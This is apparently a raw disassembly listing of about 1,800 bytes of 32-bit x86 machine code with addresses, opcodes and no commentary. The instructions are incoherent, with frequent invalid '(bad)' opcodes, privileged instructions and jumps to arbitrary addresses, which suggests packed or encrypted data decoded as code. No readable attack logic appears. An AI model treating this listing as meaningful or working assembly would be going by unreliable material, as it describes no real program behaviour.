  40d97a:	imul   ebp,DWORD PTR [edi],0xb63b2aa2
  40d980:	imul   edi,DWORD PTR [edi+eiz*4],0x6e86d7e6
  40d987:	es scas al,BYTE PTR es:[edi]
  40d989:	push   ebp
  40d98a:	or     dl,bl
  40d98c:	push   ebp
  40d98d:	xchg   ebx,eax
  40d98f:	or     esp,eax
  40d991:	push   ebp
  40d992:	cmp    BYTE PTR [eax+0x260a343a],bh
  40d998:	push   eax
  40d999:	pusha  
  40d99a:	(bad)  [ecx+0x3308b83d]
  40d9a0:	mov    ah,0xc5
  40d9a2:	add    al,0xf
  40d9a4:	xor    BYTE PTR [ebx+0x56],0x56
  40d9a8:	jecxz  0x40d9d0
  40d9aa:	or     esp,DWORD PTR [ebx+edx*8+0x1304ff80]
  40d9b1:	xchg   esi,eax
  40d9b2:	or     ah,BYTE PTR [esi-0x1445d2fc]
  40d9b8:	jmp    0xced7:0x6d48d753
  40d9bf:	(bad)  [ecx-0x3dbe989c]
  40d9c5:	fild   WORD PTR [edx+ebx*8]
  40d9c8:	mov    esi,edi
  40d9ca:	pusha  
  40d9cb:	mov    ebp,0x89c02327
  40d9d0:	fidivr WORD PTR [ebx+0xc]
  40d9d3:	adc    dh,BYTE PTR [ecx+0x32]
  40d9d6:	mov    ebp,0x67391928
  40d9db:	mov    dh,0x3
  40d9dd:	pop    edx
  40d9de:	mov    ss,WORD PTR [ebp+0xe]
  40d9e1:	add    eax,DWORD PTR [eax+0x3d]
  40d9e4:	sub    eax,0xab255415
  40d9e9:	jmp    0x40d96f
  40d9eb:	push   edx
  40d9ec:	dec    eax
  40d9ed:	stos   BYTE PTR es:[edi],al
  40d9ee:	dec    esp
  40d9ef:	mov    dh,0xdc
  40d9f1:	cli    
  40d9f2:	xor    dl,BYTE PTR [ebx]
  40d9f4:	mov    ecx,0xc43df1d3
  40d9f9:	xchg   DWORD PTR [ebp+0x57185e09],esp
  40d9ff:	xchg   ecx,eax
  40da00:	loope  0x40d9ee
  40da02:	dec    ebx
  40da03:	into   
  40da04:	dec    ebp
  40da05:	mov    ah,0x35
  40da07:	(bad)  
  40da08:	les    ebp,FWORD PTR [ecx]
  40da0a:	push   es
  40da0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da0c:	jge    0x40d9d5
  40da0e:	or     al,0x75
  40da10:	jle    0x40da44
  40da12:	cld    
  40da13:	int    0xc2
  40da15:	xor    eax,0xef62eec1
  40da1a:	enter  0xcd1f,0x8f
  40da1e:	mov    ds:0x7c2b3a4f,eax
  40da23:	mov    cl,0x58
  40da25:	add    eax,0x84f4ab56
  40da2a:	sar    ecx,cl
  40da2c:	retf   0x48c6
  40da2f:	sub    DWORD PTR [edi],esi
  40da31:	clts   
  40da33:	mov    eax,0x13d447ad
  40da38:	call   0x3ff26c5c
  40da3d:	retf   0xb28d
  40da40:	or     al,0xaa
  40da42:	repnz cmp edx,DWORD PTR [ebp+0x3b07bbcc]
  40da49:	mov    esp,eax
  40da4b:	cli    
  40da4c:	(bad)  
  40da4e:	rol    edi,cl
  40da50:	fisubr DWORD PTR [edx]
  40da52:	test   eax,0x2701bff9
  40da58:	mov    ch,0x65
  40da5a:	pop    ebx
  40da5b:	imul   ebx,DWORD PTR [edx],0x5d681188
  40da61:	xchg   ebp,ebp
  40da63:	mov    edi,0x8f1d8e5e
  40da68:	aam    0x23
  40da6a:	mov    ebp,0x292e76e2
  40da6f:	inc    edi
  40da70:	test   eax,0xe5aa63f6
  40da75:	stos   DWORD PTR es:[di],eax
  40da77:	xchg   ebx,eax
  40da78:	stos   DWORD PTR es:[edi],eax
  40da79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da7a:	retf   
  40da7b:	ja     0x40da65
  40da7d:	mov    ah,0xc4
  40da7f:	mov    bl,0xd7
  40da81:	jp     0x40dab4
  40da83:	cmp    al,0xf4
  40da85:	fisubr WORD PTR [edi]
  40da87:	jae    0x40da8c
  40da89:	jne    0x40da15
  40da8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da8c:	enter  0x4eb7,0x16
  40da90:	inc    ebx
  40da91:	fstp   TBYTE PTR [edx]
  40da93:	cmp    DWORD PTR [ebp-0x74a16236],esp
  40da99:	mov    al,ds:0x8f7644fd
  40da9e:	div    DWORD PTR [ebp-0x43]
  40daa1:	ds adc al,0x4d
  40daa4:	and    eax,0x55da9b15
  40daa9:	mov    bl,0xaf
  40daab:	fist   DWORD PTR [edi+0x36]
  40daae:	mov    bh,cl
  40dab0:	pop    esp
  40dab1:	cmc    
  40dab2:	dec    ebx
  40dab3:	hlt    
  40dab4:	mov    ebp,0x2f8d1d4
  40dab9:	mov    cl,0x96
  40dabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dabc:	lods   al,BYTE PTR ds:[esi]
  40dabd:	mov    al,ds:0x4d018b9f
  40dac2:	sar    DWORD PTR [ebx+0x4b],1
  40dac5:	mov    ch,BYTE PTR [ecx]
  40dac7:	fwait
  40dac8:	test   BYTE PTR [eax],bh
  40daca:	inc    ebp
  40dacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dacc:	xor    eax,0xc401ffc0
  40dad1:	push   DWORD PTR [esi-0x1d]
  40dad4:	inc    ecx
  40dad5:	and    eax,DWORD PTR [ebx-0xf]
  40dad8:	outs   dx,DWORD PTR ds:[esi]
  40dad9:	(bad)  
  40dada:	pop    ebx
  40dadb:	ret    0x19db
  40dade:	ins    DWORD PTR es:[edi],dx
  40dadf:	xchg   esi,eax
  40dae0:	retf   0x5cc6
  40dae3:	inc    ecx
  40dae4:	pop    ss
  40dae5:	push   ds
  40dae6:	sti    
  40dae7:	jnp    0x40daeb
  40dae9:	push   es
  40daea:	shr    DWORD PTR [esp+edx*4],0xa2
  40daee:	(bad)  
  40daef:	xchg   ebp,eax
  40daf0:	inc    edx
  40daf1:	xchg   ebp,eax
  40daf2:	adc    DWORD PTR [ecx],esi
  40daf4:	push   edi
  40daf5:	pushf  
  40daf6:	xchg   esp,eax
  40daf7:	dec    edi
  40daf8:	sahf   
  40daf9:	call   0x9b21d7dc
  40dafe:	clc    
  40daff:	call   FWORD PTR [ecx+0x5867215d]
  40db05:	xor    BYTE PTR ds:0x24cdf093,cl
  40db0b:	dec    edx
  40db0c:	jl     0x40db1b
  40db0e:	dec    ebp
  40db0f:	and    eax,0x2fd0e76f
  40db14:	push   ss
  40db15:	xchg   ebp,eax
  40db16:	or     eax,0x7f996497
  40db1b:	(bad)  
  40db1c:	(bad)  
  40db1e:	mov    ah,0x7f
  40db20:	inc    edi
  40db21:	mov    bh,0x6a
  40db23:	(bad)  
  40db24:	test   eax,0x46570c6d
  40db29:	into   
  40db2a:	mov    edi,0xb27b58fe
  40db2f:	clc    
  40db30:	push   edx
  40db31:	inc    ecx
  40db32:	lock cmc 
  40db34:	and    eax,0xf4474554
  40db39:	mov    ds:0xebce5e78,al
  40db3e:	imul   edx,DWORD PTR [ecx+0x58],0x243df02a
  40db45:	mov    dl,bh
  40db47:	xchg   ebx,eax
  40db48:	xchg   edi,eax
  40db49:	jnp    0x40dbc1
  40db4b:	pop    esi
  40db4c:	inc    ebx
  40db4d:	retf   
  40db4e:	inc    eax
  40db4f:	mov    ecx,0x6b649bf6
  40db54:	cwde   
  40db55:	add    BYTE PTR [esi],0x7b
  40db58:	jmp    0xa6ed05ef
  40db5d:	inc    esp
  40db5e:	pushf  
  40db5f:	repnz pop ds
  40db61:	jbe    0x40db06
  40db63:	sahf   
  40db64:	lods   al,BYTE PTR ds:[esi]
  40db65:	push   0xffffffb8
  40db67:	and    eax,0xf7d11907
  40db6c:	add    al,0x74
  40db6e:	clc    
  40db6f:	mov    ebp,0x5f3e7cb1
  40db74:	arpl   WORD PTR [ebp+0x68],sp
  40db77:	gs add bh,ah
  40db7a:	inc    ebx
  40db7b:	mov    bl,0xba
  40db7d:	xor    esi,edx
  40db7f:	fucomip st,st(4)
  40db81:	test   al,0x64
  40db83:	push   ebx
  40db84:	jns    0x40db0c
  40db86:	mov    ecx,ebp
  40db88:	cmp    ah,BYTE PTR [ecx+edx*2]
  40db8b:	mov    cs,WORD PTR [ebp+eax*4+0xbc58cc1]
  40db92:	out    dx,al
  40db93:	mov    edi,0xbd01334e
  40db98:	sub    al,cl
  40db9a:	(bad)  
  40db9b:	iret   
  40db9c:	lahf   
  40db9d:	fwait
  40db9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db9f:	xchg   ebx,eax
  40dba0:	jno    0x40db6f
  40dba2:	ja     0x40dc21
  40dba4:	inc    esp
  40dba5:	fcomp  DWORD PTR [ebx]
  40dba7:	and    BYTE PTR [eax],0xe6
  40dbaa:	jg     0x40dbde
  40dbac:	mov    dh,BYTE PTR [edi+0x55]
  40dbaf:	add    eax,0x120a43a9
  40dbb4:	adc    bl,BYTE PTR [eax+esi*1-0x35a064a0]
  40dbbb:	pop    eax
  40dbbc:	out    0x83,al
  40dbbe:	sub    edi,edx
  40dbc0:	nop
  40dbc1:	test   dh,bh
  40dbc3:	int3   
  40dbc4:	cld    
  40dbc5:	fdivr  st(6),st
  40dbc7:	aas    
  40dbc8:	xlat   BYTE PTR ds:[ebx]
  40dbc9:	sbb    al,0x1b
  40dbcb:	out    dx,al
  40dbcc:	adc    al,0x24
  40dbce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbcf:	les    ebx,FWORD PTR [edi]
  40dbd1:	and    eax,0xa36762b2
  40dbd6:	xchg   ebp,eax
  40dbd7:	into   
  40dbd8:	jl     0x40dbaf
  40dbda:	push   es
  40dbdb:	mov    edi,0x3316aa20
  40dbe0:	scas   al,BYTE PTR es:[edi]
  40dbe1:	arpl   ax,sp
  40dbe3:	gs (bad) 
  40dbe5:	shl    BYTE PTR [eax+edx*4+0x26],0xe3
  40dbea:	repnz fs daa 
  40dbed:	ret    
  40dbee:	adc    edx,DWORD PTR [bp+si-0x50]
  40dbf2:	push   ebp
  40dbf3:	test   BYTE PTR [ebx+0x21bd5767],ch
  40dbf9:	or     al,0x36
  40dbfb:	test   al,0xf7
  40dbfd:	mov    esp,0xb4e01c23
  40dc02:	pop    edi
  40dc03:	(bad)  
  40dc04:	mov    esi,0x42328f4c
  40dc09:	mov    ?,WORD PTR [eax]
  40dc0b:	call   0x64412aef
  40dc10:	(bad)  
  40dc11:	stos   DWORD PTR es:[edi],eax
  40dc12:	mov    ch,0x10
  40dc14:	adc    eax,0xf08cfd59
  40dc19:	sub    ebp,DWORD PTR [ebx]
  40dc1b:	xor    eax,DWORD PTR [esi+0x5e9e0c17]
  40dc21:	or     al,0x3d
  40dc23:	mov    eax,ds:0xc3e6fad0
  40dc28:	cdq    
  40dc29:	pop    eax
  40dc2a:	sub    dh,BYTE PTR ds:0x51a799
  40dc30:	inc    edx
  40dc31:	test   al,0x22
  40dc33:	dec    DWORD PTR [esi+edi*4]
  40dc36:	xchg   ecx,ebp
  40dc38:	call   0x7bfa8c07
  40dc3d:	pop    ss
  40dc3e:	mov    dh,BYTE PTR [ecx]
  40dc40:	jbe    0x40dc9c
  40dc42:	mov    ch,0x5
  40dc44:	mov    dh,0x10
  40dc46:	mov    bh,0x5
  40dc48:	jle    0x40dc86
  40dc4a:	int3   
  40dc4b:	xchg   DWORD PTR [esi+0x2a],eax
  40dc4e:	pop    edx
  40dc4f:	push   cs
  40dc50:	and    al,0xf6
  40dc52:	jnp    0x40dcae
  40dc54:	shl    BYTE PTR [ecx+0xba62fd9],cl
  40dc5a:	add    eax,0x1cf35efd
  40dc5f:	jbe    0x40dc6d
  40dc61:	sub    dl,ch
  40dc63:	jmp    0x40dca7
  40dc65:	add    bh,BYTE PTR [ebx]
  40dc67:	pop    edi
  40dc68:	jno    0x40dc8e
  40dc6a:	test   al,0xbe
  40dc6c:	pop    edx
  40dc6d:	jl     0x40dc51
  40dc6f:	ins    DWORD PTR es:[edi],dx
  40dc70:	mov    edx,0x90a4315b
  40dc75:	cwde   
  40dc76:	aas    
  40dc77:	scas   eax,DWORD PTR es:[edi]
  40dc78:	popa   
  40dc79:	cmc    
  40dc7a:	shr    BYTE PTR [eax+0x5],0xc6
  40dc7e:	scas   eax,DWORD PTR es:[edi]
  40dc7f:	add    ch,al
  40dc81:	add    al,0x8c
  40dc83:	rol    bl,1
  40dc85:	inc    edi
  40dc86:	aam    0x50
  40dc88:	fstp   TBYTE PTR [edx+0x24]
  40dc8b:	or     cl,BYTE PTR [esi+0x6b]
  40dc8e:	int3   
  40dc8f:	outs   dx,BYTE PTR ds:[esi]
  40dc90:	adc    dh,0xb8
  40dc93:	stos   BYTE PTR es:[edi],al
  40dc94:	data16 jnp 0x40dc72
  40dc97:	push   ss
  40dc98:	adc    ecx,DWORD PTR [esi-0x42]
  40dc9b:	repnz fcomp QWORD PTR [edx+0x2e8039ba]
  40dca2:	mov    bh,0x59
  40dca4:	icebp  
  40dca5:	inc    eax
  40dca6:	jmp    0x3c14:0xbded21f1
  40dcad:	inc    edi
  40dcae:	or     al,0x9c
  40dcb0:	jb     0x40dcc5
  40dcb2:	adc    esp,DWORD PTR [edi]
  40dcb4:	pop    eax
  40dcb5:	js     0x40dd15
  40dcb7:	stos   DWORD PTR es:[edi],eax
  40dcb8:	hlt    
  40dcb9:	ja     0x40dcb6
  40dcbb:	xchg   ecx,eax
  40dcbc:	loopne 0x40dd07
  40dcbe:	adc    al,dh
  40dcc0:	nop
  40dcc1:	dec    ebp
  40dcc2:	call   0xd19ab296
  40dcc7:	sbb    bh,BYTE PTR [edx-0x3296f36f]
  40dccd:	scas   al,BYTE PTR es:[edi]
  40dcce:	inc    esp
  40dccf:	popa   
  40dcd0:	ins    BYTE PTR es:[edi],dx
  40dcd1:	jae    0x40dc57
  40dcd3:	jge    0x40dcee
  40dcd5:	fisubr WORD PTR [ecx-0x61]
  40dcd8:	xchg   ebp,eax
  40dcd9:	jg     0x40dc77
  40dcdb:	outs   dx,BYTE PTR ds:[esi]
  40dcdc:	xchg   ebx,eax
  40dcdd:	add    cl,BYTE PTR [eax]
  40dcdf:	xor    al,0x95
  40dce1:	jns    0x40dd47
  40dce3:	stos   BYTE PTR es:[edi],al
  40dce4:	mov    esi,DWORD PTR [ebx+0x1dccc196]
  40dcea:	cli    
  40dceb:	mov    ch,0xda
  40dced:	mov    ah,0x16
  40dcef:	test   BYTE PTR [esi],cl
  40dcf1:	push   0xe85ca4bc
  40dcf6:	ins    BYTE PTR es:[edi],dx
  40dcf7:	cmp    DWORD PTR [esi+0x37af20a5],esi
  40dcfd:	mov    ch,0x63
  40dcff:	mov    BYTE PTR [eax],dl
  40dd01:	sbb    eax,0xe5c7eec
  40dd06:	push   DWORD PTR [edi+0x42]
  40dd09:	jns    0x40dd61
  40dd0b:	ds jmp 0x40dcd6
  40dd0e:	mov    ebx,0x4c28e2e1
  40dd13:	xor    ebp,edi
  40dd15:	inc    edx
  40dd16:	lods   eax,DWORD PTR ds:[esi]
  40dd17:	cs ss sub al,0x83
  40dd1b:	std    
  40dd1c:	fiadd  DWORD PTR [esi-0x5f]
  40dd1f:	das    
  40dd20:	int3   
  40dd21:	daa    
  40dd22:	xor    eax,0x8434fe07
  40dd27:	and    edi,DWORD PTR [esi-0xb]
  40dd2a:	mov    ds:0x6730557d,al
  40dd2f:	pop    esp
  40dd30:	(bad)
  40dd33:	push   ebp
  40dd34:	jo     0x40dda0
  40dd36:	and    DWORD PTR [edi+0x61160393],edi
  40dd3c:	jp     0x40dda2
  40dd3e:	jecxz  0x40dd8c
  40dd40:	mul    BYTE PTR [eax+0x19]
  40dd43:	pop    edx
  40dd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd45:	pop    eax
  40dd46:	mov    ah,0xad
  40dd48:	xchg   DWORD PTR [ebp+0x7049dc63],ebp
  40dd4e:	sub    al,BYTE PTR [ebx+0x61939bdb]
  40dd54:	inc    ecx
  40dd55:	push   ecx
  40dd56:	push   esi
  40dd57:	fmul   QWORD PTR [edi+eiz*1]
  40dd5a:	jp     0x40dd68
  40dd5c:	fldenv [edi-0x5b225c7f]
  40dd62:	or     bh,BYTE PTR [ebp+0x74]
  40dd65:	push   ebx
  40dd66:	mov    ch,0x82
  40dd68:	lea    ebx,[ecx-0x59]
  40dd6b:	loope  0x40ddea
  40dd6d:	pop    ebx
  40dd6e:	dec    edi
  40dd6f:	xor    eax,0x1fa0c625
  40dd74:	loope  0x40dd13
  40dd76:	sbb    al,0xd4
  40dd78:	push   ebx
  40dd79:	mov    cl,0x6a
  40dd7b:	mov    bh,0xa2
  40dd7d:	stos   BYTE PTR es:[edi],al
  40dd7e:	in     al,0xa3
  40dd80:	xor    dl,BYTE PTR [eax]
  40dd82:	fbstp  TBYTE PTR ds:0xd125051f
  40dd88:	aam    0x34
  40dd8a:	test   al,0x11
  40dd8c:	fcom   QWORD PTR [ebp+edx*8-0x6e7d3e4d]
  40dd93:	ins    BYTE PTR es:[edi],dx
  40dd94:	mov    ecx,0xd28767ca
  40dd99:	test   BYTE PTR ds:0x8b57f233,ah
  40dd9f:	test   al,0x47
  40dda1:	dec    esp
  40dda2:	ret    
  40dda3:	stc    
  40dda4:	test   al,0xd6
  40dda6:	popf   
  40dda7:	sub    BYTE PTR [edi+0x2e696f0b],cl
  40ddad:	jle    0x40de2b
  40ddaf:	sbb    eax,0x6d95d15
  40ddb4:	add    BYTE PTR [ecx+0x437615eb],dh
  40ddba:	xlat   BYTE PTR ds:[ebx]
  40ddbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddbc:	pop    edi
  40ddbd:	cmova  edi,DWORD PTR [ebx+0x196aace4]
  40ddc4:	xchg   esi,eax
  40ddc5:	adc    al,0x91
  40ddc7:	sbb    BYTE PTR [ecx],0x26
  40ddca:	and    eax,0xd639d66b
  40ddcf:	push   0xa38d9fde
  40ddd4:	push   esi
  40ddd5:	imul   ecx,edi,0xffffffc0
  40ddd8:	push   ecx
  40ddd9:	fndisi(8087 only) 
  40dddb:	and    esp,DWORD PTR [ecx]
  40dddd:	popf   
  40ddde:	int    0x33
  40dde0:	jne    0x40dd81
  40dde2:	popa   
  40dde3:	cmp    esi,DWORD PTR [ecx]
  40dde5:	shl    DWORD PTR [edx+0xb],0x34
  40dde9:	(bad)  
  40ddea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddeb:	test   eax,0xea2535aa
  40ddf0:	(bad)  
  40ddf1:	fld    QWORD PTR [edi-0x28]
  40ddf4:	call   0x63308db4
  40ddf9:	and    ah,BYTE PTR [ecx+0x3c8add94]
  40ddff:	aad    0x8b
  40de01:	mov    dh,0xc1
  40de03:	pop    es
  40de04:	fwait
  40de05:	xor    esi,ebp
  40de07:	outs   dx,BYTE PTR ds:[esi]
  40de08:	sub    esi,edi
  40de0a:	adc    DWORD PTR [eax+0x76],ecx
  40de0d:	sti    
  40de0e:	mov    cl,bl
  40de10:	xchg   edi,eax
  40de11:	aad    0x8b
  40de13:	outs   dx,DWORD PTR ds:[esi]
  40de14:	(bad)  
  40de15:	push   0xae7234ed
  40de1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de1b:	lea    ecx,[ebx]
  40de1d:	ins    BYTE PTR es:[edi],dx
  40de1e:	mov    ebp,0xc13aca59
  40de23:	fs or  eax,0x681890a7
  40de29:	call   0xad8c:0xca2744a0
  40de30:	cwde   
  40de31:	bnd jp 0x40de52
  40de34:	call   0x69d22755
  40de39:	jg     0x40de2e
  40de3b:	xor    edi,ebp
  40de3d:	or     esp,DWORD PTR [ecx+edi*1+0x7]
  40de41:	mov    edx,0x13c61e45
  40de46:	push   ecx
  40de47:	sub    DWORD PTR [ebx-0x53],ecx
  40de4a:	mov    ah,0x39
  40de4c:	mov    BYTE PTR [edi],al
  40de4e:	(bad)  
  40de4f:	sbb    al,0xec
  40de51:	jb     0x40debd
  40de53:	retf   0x8330
  40de56:	jne    0x40de11
  40de58:	cli    
  40de59:	jle    0x40de11
  40de5b:	xor    esi,DWORD PTR [esi-0x73]
  40de5e:	ins    DWORD PTR es:[edi],dx
  40de5f:	punpckhbw mm4,QWORD PTR [ebx+0x33]
  40de63:	xor    eax,0xa570086f
  40de68:	ins    BYTE PTR es:[edi],dx
  40de69:	ss cmp al,0xad
  40de6c:	out    0xcc,eax
  40de6e:	daa    
  40de6f:	int    0x18
  40de71:	cmp    al,0xc2
  40de73:	and    al,0x9c
  40de75:	lds    ecx,FWORD PTR [edx]
  40de77:	(bad)  [eax-0x33]
  40de7a:	jae    0x40de68
  40de7c:	push   ss
  40de7d:	push   edi
  40de7e:	cli    
  40de7f:	cwde   
  40de80:	xor    DWORD PTR [eax+0x45b6f6f],edx
  40de86:	out    0x9f,al
  40de88:	pop    ds
  40de89:	scas   eax,DWORD PTR es:[edi]
  40de8a:	out    0x85,al
  40de8c:	(bad)  
  40de8d:	call   0x6326:0x2e41f4aa
  40de94:	jbe    0x40de1d
  40de96:	mov    BYTE PTR [ecx-0x2],bh
  40de99:	sbb    dl,dl
  40de9b:	mul    dh
  40de9d:	cs add ah,al
  40dea0:	dec    esp
  40dea1:	ins    BYTE PTR es:[edi],dx
  40dea2:	push   ds
  40dea3:	or     BYTE PTR [ecx],ah
  40dea5:	sub    BYTE PTR [edi+0x351b889a],al
  40deab:	push   edi
  40deac:	gs into 
  40deae:	arpl   di,di
  40deb0:	dec    esi
  40deb1:	adc    BYTE PTR [esi-0x5e82bb3e],0x8c
  40deb8:	or     bl,ch
  40deba:	mov    ebp,0x514afdb9
  40debf:	sub    al,0x83
  40dec1:	fidiv  WORD PTR [edi+0x34]
  40dec4:	push   edx
  40dec5:	pop    edx
  40dec6:	test   eax,0x4dbf99c2
  40decb:	push   0xffffffb8
  40decd:	enter  0xa01f,0xe5
  40ded1:	and    eax,0x81f8b81b
  40ded6:	jne    0x40de79
  40ded8:	mov    eax,ds:0x8c54833d
  40dedd:	ja     0x40df19
  40dedf:	sar    DWORD PTR [esi-0x71ae0906],cl
  40dee5:	nop
  40dee6:	std    
  40dee7:	aad    0xdd
  40dee9:	enter  0x394c,0x40
  40deed:	mov    ah,0xb7
  40deef:	dec    ebx
  40def0:	loop   0x40df5d
  40def2:	xchg   ebx,eax
  40def3:	dec    esi
  40def4:	inc    ebp
  40def5:	test   eax,0x3e3a52a5
  40defa:	push   es
  40defb:	(bad)  
  40defc:	div    BYTE PTR [eax+0x11]
  40deff:	mov    al,0xa5
  40df01:	neg    BYTE PTR [esi+0x7d4a7b3d]
  40df07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df08:	xor    DWORD PTR ds:0x8fae458d,ecx
  40df0e:	or     BYTE PTR [edi-0x1bc27d77],bl
  40df14:	pop    es
  40df15:	mov    esi,0x433f0f82
  40df1a:	mov    ebx,0x6c6a0a50
  40df1f:	xchg   ebp,eax
  40df20:	ins    DWORD PTR es:[edi],dx
  40df21:	(bad)  
  40df22:	fcom   QWORD PTR [esi-0x68]
  40df25:	cmp    al,0x31
  40df27:	scas   al,BYTE PTR es:[edi]
  40df28:	test   al,0x10
  40df2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df2b:	mov    dh,0x24
  40df2d:	mov    ds:0x43fc8ba1,al
  40df32:	fldcw  WORD PTR [ebp+0x8e0eefd]
  40df38:	sub    edx,DWORD PTR [ebx-0x5f]
  40df3b:	inc    ebp
  40df3c:	pusha  
  40df3d:	std    
  40df3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df3f:	pop    ecx
  40df40:	fsubr  DWORD PTR [ebp-0x5e]
  40df43:	cdq    
  40df44:	dec    ebp
  40df45:	adc    BYTE PTR [ecx+0x62],bh
  40df48:	mov    eax,ds:0x11e16629
  40df4d:	sbb    BYTE PTR [esi],ah
  40df4f:	mov    edx,0xa29637d5
  40df54:	push   eax
  40df55:	push   ds
  40df56:	mov    dl,0xab
  40df58:	ror    DWORD PTR [edx-0x73508e3f],0x38
  40df5f:	and    DWORD PTR [ebp+edx*8-0x55acf200],ebp
  40df66:	cmp    eax,0x8b02ba07
  40df6b:	or     al,0xbd
  40df6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df6e:	jno    0x40df2e
  40df70:	jnp    0x40dfda
  40df72:	xchg   esi,eax
  40df73:	pop    edx
  40df74:	and    eax,0x8556e607
  40df79:	add    BYTE PTR [ecx-0x500016e2],0xdb
  40df80:	cli    
  40df81:	add    edi,DWORD PTR [ecx]
  40df83:	idiv   DWORD PTR [esi-0x1]
  40df86:	adc    eax,0x102ec438
  40df8b:	mov    ebx,0xf313a166
  40df90:	dec    ecx
  40df91:	dec    ebx
  40df92:	mov    esi,edi
  40df94:	inc    esi
  40df95:	pushf  
  40df96:	leave  
  40df97:	mov    ds:0x643766f0,al
  40df9c:	(bad)  
  40df9d:	cdq    
  40df9e:	lahf   
  40df9f:	addr16 int3 
  40dfa1:	or     al,0xfc
  40dfa3:	push   0xc1fd4330
  40dfa8:	cmp    ebx,DWORD PTR [esi+esi*1+0x651ba1a7]
  40dfaf:	rcr    ch,1
  40dfb1:	mov    dl,0xb5
  40dfb3:	enter  0x4d7b,0x74
  40dfb7:	shl    ebp,0xd2
  40dfba:	mov    dl,0x9c
  40dfbc:	add    eax,0x683a1f30
  40dfc1:	std    
  40dfc2:	and    esp,ecx
  40dfc4:	in     eax,dx
  40dfc5:	je     0x40e036
  40dfc7:	aad    0xde
  40dfc9:	dec    edi
  40dfca:	in     al,0x28
  40dfcc:	sub    al,0x22
  40dfce:	mov    ds:0x45ef5ffa,al
  40dfd3:	xlat   BYTE PTR ds:[ebx]
  40dfd4:	std    
  40dfd5:	mov    cl,0x8f
  40dfd7:	push   ss
  40dfd8:	lock aas 
  40dfda:	inc    edx
  40dfdb:	mov    esp,0x2851a058
  40dfe0:	jns    0x40e03b
  40dfe2:	xor    eax,0x38a32e09
  40dfe7:	(bad)  
  40dfe9:	cmp    al,0x9e
  40dfeb:	mov    ds:0xde0458,eax
  40dff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dff1:	sti    
  40dff2:	or     DWORD PTR [ebp-0x58],edx
  40dff5:	outs   dx,BYTE PTR ds:[esi]
  40dff6:	stc    
  40dff7:	push   es
  40dff8:	dec    ebx
  40dff9:	sbb    eax,0x91017aaa
  40dffe:	cmc    
  40dfff:	js     0x40dfe4
  40e001:	push   esp
  40e002:	iret   
  40e003:	repz inc esi
  40e005:	loope  0x40e00b
  40e007:	cmp    eax,0x12
  40e00a:	push   ebx
  40e00b:	bts    DWORD PTR [ecx],esi
  40e00e:	ins    BYTE PTR es:[edi],dx
  40e00f:	ja     0x40e073
  40e011:	inc    ecx
  40e012:	xchg   DWORD PTR [ecx],esi
  40e014:	xor    dl,cl
  40e016:	mov    cl,0x74
  40e018:	clc    
  40e019:	repz cld 
  40e01b:	mov    ebx,0x6208aa7f
  40e020:	es out 0x10,al
  40e023:	mov    bl,BYTE PTR ds:0x4411cfcc
  40e029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e02a:	sti    
  40e02b:	retf   
  40e02c:	leave  
  40e02d:	sbb    eax,0xa59ace7f
  40e032:	sub    DWORD PTR cs:[ebx+0x64207ae8],0x22
  40e03a:	adc    DWORD PTR [ecx+0x5d0047ab],ebp
  40e040:	mov    BYTE PTR [edi+0x4b],bl
  40e043:	je     0x40e072
  40e045:	push   ebp
  40e046:	fcmovnbe st,st(6)
  40e048:	in     al,dx
  40e049:	in     eax,dx
  40e04a:	mov    bh,BYTE PTR [edi]
  40e04c:	iret   
  40e04d:	mov    dh,0x8b
  40e04f:	inc    ebp
  40e050:	jge    0x40e048
  40e052:	out    dx,eax
  40e053:	mov    eax,0x507b1e3
  40e058:	in     eax,0xea
  40e05a:	and    BYTE PTR [eax-0x162f433b],bl
  40e060:	fwait
  40e061:	pushf  
  40e062:	sbb    cl,0xa4
  40e065:	add    BYTE PTR [edx+0x6a],0x1d
  40e069:	scas   eax,DWORD PTR es:[edi]
  40e06a:	or     dl,BYTE PTR [edi+ecx*1+0x6d]
  40e06e:	inc    eax
  40e06f:	dec    esi
  40e070:	pop    ecx
  40e071:	mov    cl,cl
  40e073:	popa   
  40e074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e075:	xor    ah,ah
  40e077:	adc    BYTE PTR [ecx],al
  40e079:	jmp    0xc64b2361
  40e07e:	push   0xfffffff7
  40e080:	xlat   BYTE PTR ds:[ebx]
  40e081:	add    DWORD PTR [eax+0x2d],0xdde5cbab
  40e088:	mov    al,0xaa
  40e08a:	fs int 0x91
  40e08d:	jbe    0x40e102
  40e08f:	(bad)  
  40e090:	or     DWORD PTR [ebp+0xd000761],eax
  40e096:	das    
  40e097:	in     eax,0x63
  40e099:	and    al,0x65
  40e09b:	sbb    dl,0xf6
  40e09e:	mov    cl,BYTE PTR gs:[edx-0x33d2b834]
  40e0a5:	pop    edi
  40e0a6:	and    ecx,DWORD PTR [edx]
  40e0a8:	icebp  
  40e0a9:	inc    eax
  40e0aa:	cld    
  40e0ab:	das    
  40e0ac:	dec    esp
  40e0ad:	sub    al,al
  40e0af:	aaa    
  40e0b0:	mov    cl,0xcc
  40e0b2:	add    ebp,DWORD PTR [ecx+eiz*4]
  40e0b5:	cli    
  40e0b6:	je     0x40e0d5
  40e0b8:	or     al,ah
  40e0ba:	mov    edi,0xa055ce4a
  40e0bf:	inc    eax
  40e0c0:	sub    eax,0x99ba5992
  40e0c5:	or     al,0x2a
  40e0c7:	gs dec ebp
  40e0c9:	push   eax
  40e0ca:	pop    ds
  40e0cb:	loope  0x40e08a
